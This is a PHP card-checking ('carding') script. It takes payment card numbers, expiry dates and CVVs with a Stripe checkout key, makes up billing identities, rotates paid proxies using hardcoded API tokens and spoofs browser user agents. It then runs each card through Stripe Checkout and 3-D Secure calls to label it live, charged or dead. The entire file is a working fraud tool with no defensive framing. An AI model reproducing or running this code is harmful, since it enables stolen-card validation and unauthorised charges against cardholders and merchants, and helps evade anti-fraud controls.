<?php 
ob_start();
clearstatcache();
set_time_limit(500);
error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');

include 'useragent.php';
$agent = new userAgent();
$UAFireFox = $agent->generate('firefox'); // generates a firefox user agent on either windows or mac
$UAChrome = $agent->generate('chrome'); // generates a chrome user agent on either windows or mac
$UAMobile = $agent->generate('mobile'); // generates a mobile user agent for either iphone or android
$UAWindows = $agent->generate('windows'); // generates a windows user agent for either firefox or chrome
$UAMac = $agent->generate('mac'); // generates a mac user agent for either firefox or chrome
$UAiPhone = $agent->generate('iphone'); // generates an iphone user agent for iOS 7-10
$UAAndroid = $agent->generate('android'); // generates an android user agent for android versions 4.3-7.1, and includes randomly generated device and build number string that is correct for the version of android being displayed.

/*===[Security Setup]=========================================*/
include 'config.php';
if ($_GET['referrer'] != "Auth") { 
	$i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
	exit();
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }
  return $contents;
}

/*Card Info*/
$pklive = $_GET["pklive"];
$cslive = $_GET["cslive"];
$xamount = $_GET["xamount"];
$xemail = $_GET["xemail"];
$cards = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $cards)[0];
$mo = multiexplode(array(":", "|", ""), $cards)[1];
$yr = multiexplode(array(":", "|", ""), $cards)[2];
$cvv = multiexplode(array(":", "|", ""), $cards)[3];
if(strlen($yr) == 4){
    $yr1 = substr($yr, 2);
    };
 $last4 = substr($cc,12,4);
$ctype = substr($cc, 0,1);
if($ctype == "5"){
$ctype = "mc";
}else if($ctype == "6"){
$ctype = "discover";
}else if($ctype == "4"){
$ctype = "visa";
}else if($ctype == "3"){
$ctype = "amex";
}

# ----- [ Randomized Cookies  ] --- #

$inst = [
  'cookie' => mt_rand().'.txt'
];
$cookay = ''.getcwd().'/COOKIE';

if (!is_dir($cookay)) {
    mkdir($cookay, 0777, true);
}
$xauth = getcwd();
$zauth = str_replace('\\', '/', $xauth);

#RandomCredentials
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=au');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

#Additional Functions
fwrite(fopen('xzcookie.txt', 'w'), "");

#################[Webshare Proxy]#######################

        $web = array(
        1 => '0guh4cd3ocfqcac34bq593cfcphbhhab850za0q4', //webshare token 1
	    2 => '3e5w0ggg2wn5szucv3jzzfsjvwv30szpl7dtcw8i', //webshare token 2
	    //3 => '6km4p44plvfyzplr60xxjwqi9fvkhw3i2om7eyyz', //webshare token 3
          ); 
          $share = array_rand($web);
          $webshare_token = $web[$share];

        $prox = curl_init();
        curl_setopt($prox, CURLOPT_URL, 'https://proxy.webshare.io/api/proxy/list/');
        curl_setopt($prox, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($prox, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Authorization: Token '.$webshare_token.'';
        curl_setopt($prox, CURLOPT_HTTPHEADER, $headers);
        $webshare = curl_exec($prox);
        
        curl_close($prox);

        $prox_res = json_decode($webshare, 1);
        $count = $prox_res['count'];
        $random = rand(0,$count-1);

        $proxy_ip = $prox_res['results'][$random]['proxy_address'];
        $proxy_port = $prox_res['results'][$random]['ports']['socks5'];
        $proxy_user = $prox_res['results'][$random]['username'];
        $proxy_pass = $prox_res['results'][$random]['password'];

        $proxy = ''.$proxy_ip.':'.$proxy_port.'';
        $credentials = ''.$proxy_user.':'.$proxy_pass.'';
        $useragent= $UAiPhone;

        // FOR SHOWING IP OR PROXY ADD THIS IN Responses [IP :- '.$proxy.']

        $rotate = ''.$proxy_user.'-rotate:'.$proxy_pass.'';

        $ip = array(
        1 => 'http://p.webshare.io:80',
        2 => 'http://p.webshare.io:80',
             ); 
             $socks = array_rand($ip);
             $socks5 = $ip[$socks];

        $url = "https://api.ipify.org/";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $socks5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
        $ip1 = curl_exec($ch);
        curl_close($ch);
        ob_flush();
        if (isset($ip1)){
        $ip = '[🗸'.$ip1.']';
        }
        if (empty($ip1)){
        $ip = ' Dead:-'.$webshare_token.' ';
        }

# ----- [ ROTATING PROXY SETUP] --- #

//$rotate = 'auth-dc-any:bwrnOtQZ1taz';
//
//$ip = array(
//1 => 'http://gw.ntnt.io:5959',
//2 => 'http://gw.ntnt.io:5959',
//     ); 
//     $socks = array_rand($ip);
//     $socks5 = $ip[$socks];
//
//$url = "https://api.ipify.org/";
//$curl = curl_init();
//curl_setopt($curl, CURLOPT_URL, $url);
//curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($curl, CURLOPT_PROXY, $socks5);
//curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate); 
//$ip1 = curl_exec($curl);
//curl_close($curl);
//ob_flush();
//if (isset($ip1)){
//$ip = '[🗸ᴘʀᴏx]';
//}
//if (empty($ip1)){
//$ip = '[×ᴘʀᴏx]';
//}


$retry = 0;
again:

#---------------[ StripeUIDs ]---------------#
$url = "https://m.stripe.com/6";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_COOKIEFILE, "".$zauth."/COOKIE/".$inst['cookie']."");
curl_setopt($curl, CURLOPT_COOKIEJAR, "".$zauth."/COOKIE/".$inst['cookie']."");

$resp5 = curl_exec($curl);
$json5 = json_decode($resp5);
$muid = $json5->muid;
$guid = $json5->guid;
$sid = $json5->sid;

#PaymentMethod
$url = "https://api.stripe.com/v1/payment_methods";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "type=card&card[number]=".$cc."&card[exp_month]=".$mo."&card[exp_year]=".$yr."&billing_details[name]=".$name."+".$last."&billing_details[email]=".$xemail."&billing_details[address][country]=PH&guid=NA&muid=NA&sid=NA&key=".$pklive."&payment_user_agent=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6%3B+checkout";
//&card[number]=".$cc."&card[cvc]=".$cvv."
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$paym = curl_exec($curl);
$json = json_decode($paym);
$token = $json->id;

#Confirm
$url = "https://api.stripe.com/v1/payment_pages/".$cslive."/confirm";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "eid=NA&payment_method=".$token."&expected_amount=".$xamount."&last_displayed_line_item_group_details[subtotal]=".$xamount."&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=".$pklive."";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$xconf = curl_exec($curl);
$json = json_decode($xconf);
$xpi = $json->payment_intent->id;
$xret = $json->payment_intent->client_secret;
$xsrc = $json->payment_intent->next_action->use_stripe_sdk->three_d_secure_2_source;

#Authenticate
$url = "https://api.stripe.com/v1/3ds2/authenticate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "source=".$xsrc."&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%221080%22%2C%22browserScreenWidth%22%3A%221920%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=".$pklive."";
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$authen = curl_exec($curl);
$message = GetStr($pajax, '"message": "','"');
$result = $message;

#Pintent
$url = "https://api.stripe.com/v1/payment_intents/".$xpi."?key=".$pklive."&is_stripe_sdk=false&client_secret=".$xret."";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($curl, CURLOPT_PROXY, $socks5);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pintent = curl_exec($curl);

$url = "https://api.stripe.com/v1/payment_pages/".$cslive."?key=".$pklive."&eid=NA";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($curl, CURLOPT_PROXY, $socks5);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "content-type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pajax = curl_exec($curl);
$httpcode = curl_getinfo($curl)["http_code"];
$message = GetStr($pajax, '"message": "','"');
$ercode = GetStr($pajax, '"code": "','"');
$orderID = trim(strip_tags(GetStr($pajax, '"orderNumber":"','"')));
$sep = '<span style="color:green;"> » </span>';
$result = $message;

//if (!empty($orderID)) {
if($retry >= 5){
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
} elseif(strpos($pintent, '"status": "succeeded"') !==false){
echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » <span class="badge badge-dark">Checkout Success! '.$ip.' ['.$httpcode.']</span></small><br>';
} elseif(strpos($xconf, '"status": "succeeded"') !==false){
echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » <span class="badge badge-dark">Checkout Success! '.$ip.' ['.$httpcode.']</span></small><br>';
} elseif (strpos($pajax, 'insufficient')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.'</span></small><br>';
} elseif (strpos($pajax, 'security code')!== false) {
echo '<small><span class="badge badge-warning">#LIVE</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.'</span></small><br>';
} elseif (strpos($httpcode, '403') !== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
} elseif (strpos($pajax, 'address information') !== false) {
$retry++;
goto again;
} elseif (strpos($pajax, 'card security check') !== false) {
$retry++;
goto again;
} elseif (strpos($pajax, 'empty string') !== false) {
$retry++;
goto again;
} elseif (strpos($pajax, 'cannot complete transaction') !== false) {
$retry++;
goto again;
} elseif (strpos($authen, 'empty string')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">OTP detected. '.$ip.' ['.$httpcode.']</span></small><br>';
} elseif (strpos($pintent, 'Your card was declined.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
} else {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.' ['.$httpcode.']</span></small><br>';
}

curl_close($curl);
unset($curl);
unlink("".$zauth."/COOKIE/".$inst['cookie']."");

//echo '<small><br> #PKLIVE : <br> '.$pklive.'<br></small>';
//echo '<small><br> #CSLIVE : <br> '.$cslive.'<br></small>';
//echo '<small><br> #AMOUNT : <br> '.$xamount.'<br></small>';
//echo '<small><br> TOkenResp : <br> '.$token.'<br></small>';
//echo '<small><br> #PayM : <br> '.$paym.'<br></small>';
//echo '<small><br> #IntentRespo : <br> '.$pintent.'<br></small>';
//echo '<small><br> #Authen : <br> '.$authen.'<br></small>';
//
//echo '<small><br> #PayIntent : <br> '.$xpi.'<br></small>';
//echo '<small><br> #CSecret : <br> '.$xret.'<br></small>';
//echo '<small><br> #PaySource : <br> '.$xsrc.'<br></small>';
//
//echo '<small><br> #Confirm : <br> '.$xconf.'<br></small>';
//echo '<small><br> #Final : <br> '.$pajax.'<br></small>';
?>